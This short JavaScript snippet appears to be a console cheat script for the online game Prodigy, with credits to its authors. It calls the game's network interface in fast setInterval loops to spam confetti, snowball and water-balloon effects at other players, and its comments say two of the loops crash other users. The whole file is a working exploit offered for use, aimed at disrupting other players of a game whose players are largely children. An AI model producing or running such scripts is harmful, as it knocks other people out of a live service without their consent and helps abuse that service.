//ALL SCRIPTS APPEAR FOR OTHER USERS


//Spew confetti. Doesn't crash users:
setInterval(function(){
Phaser.GAMES[0].prodigy.network.emitMessage({action:"fx",data:{type:1, userID: Phaser.GAMES[0].prodigy.player.userID}})
},10);

//Snowball spam. Crashes users:
setInterval(()=>Phaser.GAMES[0].prodigy.network.emitMessage({"action":"fx","data":{"type":4,"userID":Phaser.GAMES[0].prodigy.player.userID,"x":Math.floor(Math.random() * 1280),"y":Math.floor(Math.random() * 720)}}));

//Water balloon spam. Crashes users:
setInterval(()=>Phaser.GAMES[0].prodigy.network.emitMessage({"action":"fx","data":{"type":3,"userID":Phaser.GAMES[0].prodigy.player.userID,"x":Math.floor(Math.random() * 1280),"y":Math.floor(Math.random() * 720)}}));


/*CREDIT*/
/*DaChickenKing | Did research on the SocketInterface in the Discord Server
TNTHacker2015 | Made base FX script, rest of scripts we're just changing type to a different value
*/
